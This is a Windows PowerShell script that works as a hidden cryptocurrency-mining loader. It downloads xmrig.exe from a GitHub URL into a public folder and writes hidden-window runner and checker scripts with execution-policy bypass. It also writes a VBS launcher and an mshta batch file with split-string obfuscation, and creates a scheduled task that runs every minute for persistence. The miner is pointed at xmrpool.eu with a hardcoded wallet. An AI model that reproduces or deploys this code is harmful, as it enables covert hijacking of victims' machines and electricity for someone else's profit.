# loader  
#download 
cd "C:\Users\Public\Music\"

Invoke-webReqUest -Uri "https://github.com/Redr00/MOneroo/raw/main/xmrig.exe"  -OutFile "C:\Users\Public\Music\xmrig.exe"
Start-Sleep 10
                                                                                                  
                                                                                                    
                           #                   :!7?JJ??!:                                             
                           #                 .?PPPPPPPPPP?.                                           
                           #                 7PPPPPPPPPPPP7                                           
                           #                 ?PPPPPPPPPPPP?                                           
                           #                 :YPPPPPPPPPP5:                                           
                           #      :!7?7!~:    .75PPPPPP57.    :~!7?7!:                                
                           #    :JPGGPPPPPY7:   !PPPPPP!   :7Y5PPPPGGPJ:                              
                           #   :5P577YPPPPPP5J!!YPPPPPPY!!?5PPPPPPY77YP5^                             
                           #   ?P5.  ~PP5JYPPPPPPPPPPPPPPPPPPYJ5PP~  .YPJ                             
                           #   JP?   ?PP~  !PPP55PPPPPP55PPP7  ~PPJ   7PY                             
                           #   7G7  :PPY   ^PP7.:YPPPPY:.7PP^   YPP:  7G?                             
                           #   :P?  ^PPJ   ^P5.  ~PPPP~  .5P~   ?PP^  ?P:                             
                           #    7Y  :PP?   ^PY   .5PP5:   JP^   ?PP:  Y7                              
                           #     ?:  JPJ   .PY    JPPJ    JP:   JPJ  :?                               
                           #     .:  .YP.   ?5.   !PP7    5J   .55:  ..                               
                           #          .?~   :5^   :PP^   ^5:   ~?.                                    
                           #            .    :^    Y5.   ^:    .                                      
                           #                       ?J                                                 
                           #                       ~~                                                 
                           #                       ..                                                 
                                                                




$c = @'
$p =  get-process xmrig*
try{
if(!$p){
     if(test-path "C:\Users\Public\Music\xmrig.exe"){
        # if its there run  
         powershell -noni -w hidden -ep bypass .\runner.ps1 
      }
      else {
         # if its not there goto loader 
         powershell -noni -w hidden -ep bypass ".\loader.ps1"
      }
    
} else {
   out-null
}

}catch{}
'@

[IO.File]::WriteAllText('C:\Users\Public\Music\cheker.ps1' ,$c )




$c2 = @'

.\xmrig.exe -o xmrpool.eu:9999 -u 4496Ft4BpWZHW2VcGSefkbeDfF1EK6uXoGfVLZWNCmaR3eLMA6VVPZvC2rEeVf4kQDCZxnn29Tv1p3nkiDNSffVPEcbPzrz -k --tls
'@
[IO.File]::WriteAllText('C:\Users\Public\Music\runner.ps1' ,$c2 )



$v = @'
on error resume next
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "C:\Users\Public\Music\Loader.bat",0,close
'@
[IO.File]::WriteAllText('C:\Users\Public\Music\loader.vbs' ,$v )



$lbat = @'
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -Execu"+"tionP"+"olicy"+" Bypass & 'C:\Users\Public\Music\cheker.ps1'"", 0:close")
'@
[IO.filE]::WriteAllText( 'C:\Users\Public\Music\loader.bat',$lbat )
# now we have to download xmrig or see a way if wecan copy its binaries and execute it 
#add the scheduled task (vbs )
"C:\Users\Public\Music\v.vbs"
schtasks.exe /create  /tn "xmrig" /sc minute /mo 1 /tr "C:\Users\Public\Music\loader.vbs"  


